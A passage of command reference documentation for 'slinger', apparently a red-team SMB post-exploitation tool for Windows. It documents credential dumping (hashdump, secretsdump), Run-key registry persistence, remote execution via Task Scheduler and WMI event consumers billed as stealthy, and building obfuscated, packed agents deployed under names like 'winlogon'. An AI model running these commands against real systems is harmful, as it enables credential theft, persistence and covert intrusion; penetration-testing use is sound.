[1;34musage: [0m[1;35mslinger download[0m [[32m-h[0m] [[36m--resume[0m] [[36m--restart[0m] [[36m--chunk-size [33mCHUNK_SIZE[0m] [32mremote_path[0m [32m[local_path][0m
Download a file from the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
  - Default: `64k`
  - Required: No

---

## `mget`

**Description:** Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.

**Help:**
```
[1;34musage: [0m[1;35mslinger mget[0m [[32m-h[0m] [[32m-r[0m] [[32m-p [33mregex[0m] [[32m-d [33mD[0m] [32m[remote_path][0m [32m[local_path][0m
Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: mget /remote/path /local/path
```

### Arguments

- **`remote_path`**: Specify the remote directory path to download from
  - Required: No

- **`local_path`**: Specify the local directory path where files will be downloaded
  - Required: No

- **`p`**: Specify a regex pattern to match filenames
  - Required: No

- **`d`**: Specify folder depth count for recursion
  - Default: `2`
  - Required: No

---

## `mkdir`

**Description:** Create a new directory on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger mkdir[0m [[32m-h[0m] [32mpath[0m
Create a new directory on the remote server
```

**Example Usage:**
```
Example Usage: mkdir /path/to/new/directory
```

### Arguments

- **`path`**: Specify the path of the directory to create
  - Required: Yes

---

## `rmdir`

**Description:** Remove a directory on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger rmdir[0m [[32m-h[0m] [32mremote_path[0m
Remove a directory on the remote server
```

**Example Usage:**
```
Example Usage: rmdir /path/to/remote/directory
```

### Arguments

- **`remote_path`**: Specify the remote path of the directory to remove
  - Required: Yes

---

## `rm`

**Description:** Delete one or more files on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger rm[0m [[32m-h[0m] [[32m-n [33mFILE_LIST[0m] [32m[remote_path][0m
Delete one or more files on the remote server
```

**Example Usage:**
```
Example Usage: rm file.txt, rm -n 'file1.txt file2.txt file3.txt'
```

### Arguments

- **`remote_path`**: Specify the remote file path to delete
  - Required: No

- **`file_list`**: Space-separated list of files to delete (quoted)
  - Required: No

---

## `#shell`

**Description:** Enter local terminal mode for command execution

**Help:**
```
[1;34musage: [0m[1;35mslinger #shell[0m [[32m-h[0m]
Enter local terminal mode for command execution
```

**Example Usage:**
```
Example Usage: #shell
```

---

## `!`

**Description:** Run a specified local command

**Help:**
```
[1;34musage: [0m[1;35mslinger ![0m [[32m-h[0m] [32m...[0m
Run a specified local command
```

**Example Usage:**
```
Example Usage: ! ls -l
```

### Arguments

- **`commands`**: Specify the local commands to run
  - Required: No

---

## `info`

**Description:** Display the status of the current session

**Help:**
```
[1;34musage: [0m[1;35mslinger info[0m [[32m-h[0m]
Display the status of the current session
```

**Example Usage:**
```
Example Usage: info
```

---

## `history`

**Description:** Display recent command history from the slinger history file

**Help:**
```
[1;34musage: [0m[1;35mslinger history[0m [[32m-h[0m] [[32m-n [33mNUM[0m]
Display recent command history from the slinger history file
```

**Example Usage:**
```
Example Usage: history, history -n 20
```

### Arguments

- **`n`**: Number of history lines to display (default: 15)
  - Default: `15`
  - Required: No

---

## `reguse`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger reguse[0m [[32m-h[0m]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstart`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger reguse[0m [[32m-h[0m]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstop`

**Description:** Disconnect from a remote registry on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger regstop[0m [[32m-h[0m]
Disconnect from a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: regstop
```

---

## `regquery`

**Description:** Query a registry key on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger regquery[0m [[32m-h[0m] [[32m-l[0m] [[32m-v[0m] [32mkey[0m
Query a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (You must use two slashes or quotes)
```

### Arguments

- **`key`**: Specify the registry key to query
  - Required: Yes

---

## `regset`

**Description:** Set a registry value on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger regset[0m [[32m-h[0m] [32m-k [33mKEY[0m [32m-v [33mVALUE[0m [32m-d [33mDATA[0m [[32m-t [33mTYPE[0m]
Set a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"
```

### Arguments

- **`key`**: Specify the registry key to set
  - Required: Yes

- **`value`**: Specify the registry value to set
  - Required: Yes

- **`data`**: Specify the registry data to set
  - Required: Yes

- **`type`**: Specify the registry type to set
  - Default: `REG_SZ`
  - Required: No

---

## `regdel`

**Description:** Delete a registry value on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger regdel[0m [[32m-h[0m] [32m-k [33mKEY[0m [[32m-v [33mVALUE[0m]
Delete a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test
```

### Arguments

- **`key`**: Specify the registry key to delete
  - Required: Yes

- **`value`**: Specify the registry value to delete
  - Required: No

---

## `regcreate`

**Description:** Create a registry key on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger regcreate[0m [[32m-h[0m] [32mkey[0m
Create a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to create
  - Required: Yes

---

## `regcheck`

**Description:** Check if a registry key exists on the remote server. This is really just an exposed helper function.

**Help:**
```
[1;34musage: [0m[1;35mslinger regcheck[0m [[32m-h[0m] [32mkey[0m
Check if a registry key exists on the remote server. This is really just an exposed helper function.
```

**Example Usage:**
```
Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to check
  - Required: Yes

---

## `portfwd`

**Description:** Forward a local port to a remote port on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger portfwd[0m [[32m-h[0m] ([32m-d[0m | [32m-a[0m | [32m-l[0m | [32m-c[0m | [36m--load[0m) [32mlocal[0m [32mremote[0m
Forward a local port to a remote port on the remote server
```

**Example Usage:**
```
Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
```

### Arguments

- **`local`**: Specify the local host and port to forward from
  - Required: Yes

- **`remote`**: Specify the remote host and port to forward to
  - Required: Yes

---

## `ifconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger ifconfig[0m [[32m-h[0m]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `ipconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger ifconfig[0m [[32m-h[0m]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `enuminterfaces`

**Description:** Display network interfaces on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger ifconfig[0m [[32m-h[0m]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `hostname`

**Description:** Display the hostname of the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger hostname[0m [[32m-h[0m]
Display the hostname of the remote server
```

**Example Usage:**
```
Example Usage: hostname
```

---

## `procs`

**Description:** List running processes on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger procs[0m [[32m-h[0m] [[32m-v[0m] [[32m-t[0m]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `ps`

**Description:** List running processes on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger procs[0m [[32m-h[0m] [[32m-v[0m] [[32m-t[0m]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `tasklist`

**Description:** List running processes on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger procs[0m [[32m-h[0m] [[32m-v[0m] [[32m-t[0m]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `fwrules`

**Description:** Display firewall rules on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger fwrules[0m [[32m-h[0m]
Display firewall rules on the remote server
```

**Example Usage:**
```
Example Usage: fwrules
```

---

## `set`

**Description:** Set a variable for use in the application

**Help:**
```
[1;34musage: [0m[1;35mslinger set[0m [[32m-h[0m] [32mvarname[0m [32m[value][0m
Set a variable for use in the application
```

**Example Usage:**
```
Example Usage: set varname value
```

### Arguments

- **`varname`**: Set the debug variable to True or False
  - Required: Yes

- **`value`**: Set the mode variable to True or False
  - Default: ``
  - Required: No

---

## `config`

**Description:** Show the current config

**Help:**
```
[1;34musage: [0m[1;35mslinger config[0m [[32m-h[0m]
Show the current config
```

**Example Usage:**
```
Example Usage: config
```

---

## `run`

**Description:** Run a slinger script or command sequence

**Help:**
```
[1;34musage: [0m[1;35mslinger run[0m [[32m-h[0m] ([32m-c [33mCMD_CHAIN[0m | [32m-f [33mFILE[0m)
Run a slinger script or command sequence
```

**Example Usage:**
```
Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
```

### Arguments

- **`cmd_chain`**: Specify a command sequence to run
  - Required: No

- **`file`**: Specify a script file to run
  - Required: No

---

## `hashdump`

**Description:** Dump hashes from the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger hashdump[0m [[32m-h[0m]
Dump hashes from the remote server
```

**Example Usage:**
```
Example Usage: hashdump
```

---

## `secretsdump`

**Description:** Dump secrets from the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger secretsdump[0m [[32m-h[0m]
Dump secrets from the remote server
```

**Example Usage:**
```
Example Usage: secretsdump
```

---

## `env`

**Description:** Display environment variables on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger env[0m [[32m-h[0m]
Display environment variables on the remote server
```

**Example Usage:**
```
Example Usage: env
```

---

## `debug-availcounters`

**Description:** Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.

**Help:**
```
[1;34musage: [0m[1;35mslinger debug-availcounters[0m [[32m-h[0m] [[32m-f [33mFILTER[0m] [[32m-p[0m] [[32m-s [33mfilename[0m]
Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: availcounters
```

### Arguments

- **`filter`**: Simple filter for case insenstive counters containing a given string
  - Required: No

- **`save`**: Save the available counters to a file
  - Required: No

---

## `debug-counter`

**Description:** Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.

**Help:**
```
[1;34musage: [0m[1;35mslinger debug-counter[0m [[32m-h[0m] [[32m-c [33mCOUNTER[0m] [[32m-a [33m{x86,x64,unk}[0m] [[32m-i[0m]
Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: counter -c 123 [-a x86]
```

### Arguments

- **`counter`**: Specify the counter to display
  - Required: No

- **`arch`**: Specify the architecture of the remote server
  - Choices: x86, x64, unk
  - Default: `unk`
  - Required: No

---

## `network`

**Description:** Display network information on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger network[0m [[32m-h[0m] [[36m--tcp[0m] [[36m--rdp[0m]
Display network information on the remote server
```

**Example Usage:**
```
Example Usage: network
```

---

## `atexec`

**Description:** Execute a command on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger atexec[0m [[32m-h[0m] [32m-c [33mCOMMAND[0m [36m--sp [33mSP[0m [[36m--sn [33mSN[0m] [[36m--tn [33mTN[0m] [[36m--ta [33mTA[0m] [[36m--td [33mTD[0m] [[36m--tf [33mTF[0m] [[36m--sh [33mSH[0m] [[32m-i[0m] [[32m-w [33mWAIT[0m]
Execute a command on the remote server
```

**Example Usage:**
```
Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\Users\\Public\\Downloads\\ -c ipconfig
For multi-word commands: atexec -c "echo hello world" -tn MyTask
```

### Arguments

- **`command`**: Specify the command to execute. For commands with spaces, wrap in quotes (e.g., 'echo hello world')
  - Required: Yes

- **`sp`**: Specify the folder to save the output file
  - Default: `\Users\Public\Downloads\`
  - Required: Yes

- **`sn`**: Specify the name of the output file.  Default is <random 8-10 chars>.txt
  - Required: No

- **`tn`**: Specify the name of the scheduled task (default: auto-generated)
  - Required: No

- **`ta`**: Specify the author of the scheduled task
  - Default: `Slinger`
  - Required: No

- **`td`**: Specify the description of the scheduled task
  - Default: `Scheduled task created by Slinger`
  - Required: No

- **`tf`**: Specify the folder to run the task in
  - Default: `\Windows`
  - Required: No

- **`sh`**: Specify the share name to connect to
  - Default: `C$`
  - Required: No

- **`wait`**: Seconds to wait for the task to complete
  - Default: `1`
  - Required: No

---

## `reload`

**Description:** Reload the current sessions context

**Help:**
```
[1;34musage: [0m[1;35mslinger reload[0m [[32m-h[0m]
Reload the current sessions context
```

**Example Usage:**
```
Example Usage: reload
```

---

## `plugins`

**Description:** List available plugins

**Help:**
```
[1;34musage: [0m[1;35mslinger plugins[0m [[32m-h[0m]
List available plugins
```

**Example Usage:**
```
Example Usage: plugins
```

---

## `downloads`

**Description:** Manage resume download states and cleanup

**Help:**
```
[1;34musage: [0m[1;35mslinger downloads[0m [[32m-h[0m] [32m{list,cleanup} ...[0m
Manage resume download states and cleanup
```

**Example Usage:**
```
Example Usage: downloads list
```

### Subcommands

#### `downloads list`

**Description:** Display all active resumable downloads with progress

**Help:**
```
[1;34musage: [0m[1;35mslinger downloads list[0m [[32m-h[0m]
Display all active resumable downloads with progress
```

  - Required: No

---

#### `downloads cleanup`

**Description:** Remove completed, stale, or corrupted download state files

**Help:**
```
[1;34musage: [0m[1;35mslinger downloads cleanup[0m [[32m-h[0m] [[36m--max-age [33mMAX_AGE[0m] [[36m--force[0m]
Remove completed, stale, or corrupted download state files
```

##### Arguments

- **`max_age`**: Remove state files older than N days
  - Default: `7`
  - Required: No

---

## `eventlog`

**Description:** Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog

**Help:**
```
[1;34musage: [0m[1;35mslinger eventlog[0m [[32m-h[0m] [32m{query,list,check} ...[0m
Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog
```

**Example Usage:**
```
Example Usage:
  eventlog list                    # List available event logs
  eventlog check --log 'System'    # Check if a specific log exists
  eventlog query --log System --level Error --count 50
  eventlog sources --log Application
```

### Subcommands

#### `eventlog query`

**Description:** Query Windows Event Log entries via RPC over \pipe\eventlog with filtering

**Help:**
```
[1;34musage: [0m[1;35mslinger eventlog query[0m [[32m-h[0m] [36m--log [33mLOG[0m [[36m--id [33mID[0m] [[36m--type [33m{error,warning,information,success,failure}[0m] [[36m--since [33mSINCE[0m] [[36m--last [33mMINUTES[0m] [[36m--limit [33mLIMIT[0m] [[36m--source [33mSOURCE[0m] [[36m--find [33mFIND[0m] [[36m--format [33m{table,json,list,csv}[0m]
                              [[32m-o [33mOUTPUT[0m] [[36m--verbose[0m] [[36m--order [33m{newest,oldest}[0m]
Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
```

**Example Usage:**
```
Examples:
  eventlog query --log System --id 1000
  eventlog query --log Application --level error --last 60
  eventlog query --log Security --find 'failed logon' --count 20
```

##### Arguments

- **`log`**: Event log name (System, Application, Security, etc.)
- **`id`**: Specific event ID to filter
- **`level`**: Event level to filter
  - Choices: error, warning, information, success, failure
- **`since`**: Events since date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM:SS')
- **`last`**: Events from the last X minutes
- **`limit`**: Maximum number of events to return
  - Default: `1000`
- **`source`**: Filter by event source name
- **`find`**: Search for string in event content
- **`format`**: Output format (default: list)
  - Choices: table, json, list, csv
  - Default: `list`
- **`output`**: Save output to file
- **`order`**: Order events by newest first (default) or oldest first
  - Choices: newest, oldest
  - Default: `newest`
  - Required: No

---

#### `eventlog list`

**Description:** List all available event logs on the remote system via RPC over \pipe\eventlog

**Help:**
```
[1;34musage: [0m[1;35mslinger eventlog list[0m [[32m-h[0m]
List all available event logs on the remote system via RPC over \pipe\eventlog
```

  - Required: No

---

#### `eventlog check`

**Description:** Check if a specific Windows Event Log exists and is accessible

**Help:**
```
[1;34musage: [0m[1;35mslinger eventlog check[0m [[32m-h[0m] [36m--log [33mLOG[0m
Check if a specific Windows Event Log exists and is accessible
```

**Example Usage:**
```
Example Usage: eventlog check --log 'Microsoft-Windows-Sysmon/Operational'
```

##### Arguments

- **`log`**: Event log name to check (can include custom paths)
  - Required: Yes

---

## `wmiexec`

**Description:** Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.

**Help:**
```
[1;34musage: [0m[1;35mslinger wmiexec[0m [[32m-h[0m] [[36m--endpoint-info[0m] [32mMETHOD ...[0m
Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.
```

**Example Usage:**
```
Available Methods:
  dcom     - Traditional Win32_Process.Create via DCOM
  event    - WMI Event Consumer (stealthy)
  query    - Execute WQL queries

Example Usage:
  wmiexec dcom 'systeminfo'                # Traditional DCOM
  wmiexec event 'net user' --trigger-delay 5  # Event consumer
  wmiexec query 'SELECT * FROM Win32_Process'  # WQL query
```

### Subcommands

#### `wmiexec dcom`

**Description:** Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.

**Help:**
```
[1;34musage: [0m[1;35mslinger wmiexec dcom[0m [[32m-h[0m] [[32m-i[0m] [[36m--working-dir [33mWORKING_DIR[0m] [[36m--timeout [33mTIMEOUT[0m] [[36m--output [33mfilename[0m] [[36m--no-output[0m] [[36m--sleep-time [33mSLEEP_TIME[0m] [[36m--save-name [33mSAVE_NAME[0m] [[36m--raw-command[0m] [[36m--shell [33m{cmd,powershell}[0m]
                            [32m[command][0m
Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
```

**Example Usage:**
```
Command Wrappers:
  DEFAULT: cmd.exe /Q /c "command"     # Standard Windows command
  execution
  --raw-command: command               # No wrapper, execute directly
  --shell powershell: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -NoLogo -Command "command"

Raw Command Usage:
  Use --raw-command when you want to execute commands WITHOUT the cmd.exe wrapper:

  Standard (with cmd.exe wrapper):
    wmiexec dcom "whoami"              # Executes: cmd.exe /Q /c whoami
    wmiexec dcom "dir C:\"            # Executes: cmd.exe /Q /c dir C:
  Raw (no wrapper):
    wmiexec dcom "whoami" --raw-command              # Executes: whoami (directly)
    wmiexec dcom "calc.exe" --raw-command            # Executes: calc.exe (directly)
    wmiexec dcom "powershell.exe -Command Get-Process" --raw-command  # Custom PowerShell

Interactive Mode:
  wmiexec dcom --interactive           # Start interactive DCOM shell
  wmiexec dcom --interactive --save-name session.txt  # Save session to file
```

##### Arguments

- **`command`**: Command to execute (not required for --interactive mode)
- **`working_dir`**: Working directory for command execution
  - Default: `C:\`
- **`timeout`**: Command execution timeout in seconds
  - Default: `30`
- **`output`**: Save command output to local file
- **`sleep_time`**: Sleep time before capturing output in seconds
  - Default: `1.0`
- **`save_name`**: Custom filename for remote output capture (default: auto-generated)
- **`shell`**: Shell to use for command execution
  - Choices: cmd, powershell
  - Default: `cmd`
  - Required: No

---

#### `wmiexec event`

**Description:** Execute commands using WMI Event Consumers (highest stealth method).

Examples:
  # Basic usage
  wmiexec event "whoami"

  # Raw command mode (direct CommandLineTemplate)
  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe

  # Custom artifacts for stealth
  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"

  # With local save
  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"


**Help:**
```
[1;34musage: [0m[1;35mslinger wmiexec event[0m [[32m-h[0m] [[36m--consumer-name [33mCONSUMER_NAME[0m] [[36m--filter-name [33mFILTER_NAME[0m] [[36m--trigger-delay [33mTRIGGER_DELAY[0m] [[36m--no-cleanup[0m] [[36m--timeout [33mTIMEOUT[0m] [[36m--no-output[0m] [[36m--save [33mfilename[0m] [[36m--working-dir [33mWORKING_DIR[0m]
                             [[36m--shell [33m{cmd,powershell}[0m] [[36m--exe [33m{cmd,pwsh}[0m] [[36m--trigger-exe [33mTRIGGER_EXE[0m] [[32m-t [33mTRIGGER[0m] [[32m-l[0m] [[32m-i[0m] [[36m--system[0m] [[36m--upload-path [33mUPLOAD_PATH[0m] [[36m--script-name [33mSCRIPT_NAME[0m] [[32m-o [33mOUTPUT[0m] [[36m--raw-command[0m]
                             [[36m--raw-exec [33mRAW_EXEC[0m]
                             [32m[command][0m
Execute commands using WMI Event Consumers (highest stealth method).

Examples:
  # Basic usage
  wmiexec event "whoami"

  # Raw command mode (direct CommandLineTemplate)
  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe

  # Custom artifacts for stealth
  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"

  # With local save
  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"

```

##### Arguments

- **`command`**: Command to execute (not required for --interactive mode)
- **`consumer_name`**: Name for CommandLineEventConsumer (default: auto-generated)
- **`filter_name`**: Name for __EventFilter (default: auto-generated)
- **`trigger_delay`**: Seconds to wait before triggering event
  - Default: `5`
- **`timeout`**: Total execution timeout in seconds
  - Default: `30`
- **`save`**: Save command output to local file
- **`working_dir`**: Working directory for command execution
  - Default: `C:\`
- **`shell`**: Shell to use for command execution
  - Choices: cmd, powershell
  - Default: `cmd`
- **`exe`**: Execution type: 'cmd' (uploads .bat file) or 'pwsh' (uploads .ps1 file)
  - Choices: cmd, pwsh
  - Default: `cmd`
- **`trigger_exe`**: Executable to trigger the Event Filter (default: notepad.exe). Will be automatically spawned after consumer creation.
  - Default: `notepad.exe`
- **`trigger`**: Only trigger an existing Event Consumer (no creation). Specify executable to spawn.
- **`upload_path`**: Custom script upload path on target (default: C:\Windows\Temp\RANDOM_NAME.ext where ext is .bat for cmd or .ps1 for pwsh)
- **`script_name`**: Custom script filename (without extension, will be auto-appended based on --exe type). If not specified, completely random name is generated.
- **`output`**: Custom remote output file path for capturing command results (default: C:\Windows\Temp\out_RANDOM.tmp). Supports CMS notation.
- **`raw_exec`**: Put the entire command directly into CommandLineTemplate. ExecutablePath is set to the provided string value.
  - Required: No

---

#### `wmiexec query`

**Description:** Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.

**Help:**
```
[1;34musage: [0m[1;35mslinger wmiexec query[0m [[32m-h[0m] [[36m--namespace [33mNAMESPACE[0m] [[36m--format [33m{list,table,json,csv}[0m] [[32m-o [33mFILE[0m] [[36m--timeout [33mSECONDS[0m] [[36m--interactive[0m | [36m--describe [33mCLASS[0m | [36m--list-classes[0m | [36m--template [33mTEMPLATE[0m | [36m--list-templates[0m | [32mquery[0m]
Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
```

**Example Usage:**
```
Query Examples:
  wmiexec query "SELECT * FROM Win32_Process"
  wmiexec query "SELECT Name, ProcessId FROM Win32_Process WHERE Name = 'notepad.exe'"
  wmiexec query "SELECT * FROM Win32_Service WHERE State = 'Running'"
  wmiexec query --describe Win32_Process
  wmiexec query --interactive
  wmiexec query --template processes --timeout 300
  wmiexec query "SELECT * FROM Win32_UserAccount" --format json -o users.json
  wmiexec query --template processes --format table
```

##### Arguments

- **`query`**: WQL query string to execute (e.g., 'SELECT * FROM Win32_Process')
- **`describe`**: Describe WMI class schema (e.g., --describe Win32_Process)
- **`template`**: Execute predefined query template (use --list-templates to see available)
- **`namespace`**: WMI namespace to query (default: root/cimv2)
  - Default: `root/cimv2`
- **`format`**: Output format for query results (default: list)
  - Choices: list, table, json, csv
  - Default: `list`
- **`output`**: Save query results to file
- **`timeout`**: Query timeout in seconds (default: 120)
  - Default: `120`
  - Required: No

---

## `agent`

**Description:** Build polymorphic C++ agents for named pipe command execution

**Help:**
```
[1;34musage: [0m[1;35mslinger agent[0m [[32m-h[0m] [32m{build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...[0m
Build polymorphic C++ agents for named pipe command execution
```

**Example Usage:**
```
Example Usage: agent build --arch x64 | agent deploy ./agent.exe --path temp\\ --name myagent --start
```

### Subcommands

#### `agent build`

**Description:** Build C++ agents with advanced obfuscation and polymorphic encryption

**Help:**
```
[1;34musage: [0m[1;35mslinger agent build[0m [[32m-h[0m] [[36m--arch [33m{x86,x64,both}[0m] [[36m--encryption[0m] [[36m--no-encryption[0m] [[36m--debug[0m] [[36m--output-dir [33mOUTPUT_DIR[0m] [[36m--dry-run[0m] [[36m--pipe [33mPIPE[0m] [[36m--name [33mNAME[0m] [[36m--pass [33mPASSPHRASE[0m] [[36m--obfuscate[0m] [[36m--upx [33mPATH[0m]
Build C++ agents with advanced obfuscation and polymorphic encryption
```

**Example Usage:**
```
Examples:
  agent build                                    # Build both x86 and x64 agents with defaults
  agent build --arch x64                         # Build only x64 agent
  agent build --pipe myagent                     # Use custom pipe name "myagent"
  agent build --name slinger                     # Output as slinger_x64.exe/slinger_x86.exe
  agent build --pass MySecretPass123             # Enable HMAC-SHA256 authentication
  agent build --obfuscate                        # Strip symbols and anti-debug
  agent build --obfuscate --upx upx              # Obfuscate and pack with UPX
  agent build --arch x64 --pipe agent1 --pass P@ss --obfuscate  # Full production build
  agent build --dry-run                          # Check build prerequisites without building
  agent build --debug                            # Enable debug logging in agent binary
```

##### Arguments

- **`arch`**: Target architecture for agent build
  - Choices: x86, x64, both
  - Default: `both`
- **`output_dir`**: Custom output directory for built agents
- **`pipe`**: Specify custom pipe name for the agent (default: slinger)
  - Default: `slinger`
- **`name`**: Specify custom name for the output binary file
- **`passphrase`**: Passphrase for agent authentication (HMAC-SHA256 with PBKDF2)
- **`upx`**: Pack Windows PE binary with UPX after building (e.g., --upx /usr/bin/upx or --upx upx for system PATH)
  - Required: No

---

#### `agent info`

**Description:** Display configuration and capabilities of the agent builder

**Help:**
```
[1;34musage: [0m[1;35mslinger agent info[0m [[32m-h[0m]
Display configuration and capabilities of the agent builder
```

  - Required: No

---

#### `agent deploy`

**Description:** Upload and execute polymorphic agent on target system via SMB

**Help:**
```
[1;34musage: [0m[1;35mslinger agent deploy[0m [[32m-h[0m] [36m--path [33mPATH[0m [36m--name [33mNAME[0m [[36m--start[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--pipe [33mPIPE[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m] [32magent_path[0m
Upload and execute polymorphic agent on target system via SMB
```

**Example Usage:**
```
Examples:
  agent deploy ./agent.exe --path temp\ --name myagent --start                    # Deploy and start with wmiexec
  agent deploy ./agent.exe --path temp\ --name myagent --start --method atexec    # Deploy and start with Task Scheduler
  agent deploy ./agent.exe --path temp\ --name myagent --start --method atexec --ta "SYSTEM"

```

##### Arguments

- **`agent_path`**: Path to the agent executable to deploy
- **`path`**: Target path relative to current share (e.g., temp\, Windows\Temp\)
- **`name`**: Name for deployed agent on target (e.g., updater, winlogon)
- **`method`**: Execution method to start agent (default: wmiexec)
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`pipe`**: Specify pipe name for the agent (must match build-time pipe name)
- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`sh`**: SMB share for output file (default: current share)
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent list`

**Description:** Show all deployed agents and their status

**Help:**
```
[1;34musage: [0m[1;35mslinger agent list[0m [[32m-h[0m] [[36m--host [33mHOST[0m] [[36m--del [33mDELETE_AGENT[0m] [[32m-f [33m{table,list,json}[0m]
Show all deployed agents and their status
```

**Example Usage:**
```
Example: agent list -f json
```

##### Arguments

- **`host`**: Filter agents by host
- **`delete_agent`**: Remove agent from registry by ID (use 'all' to remove all agents)
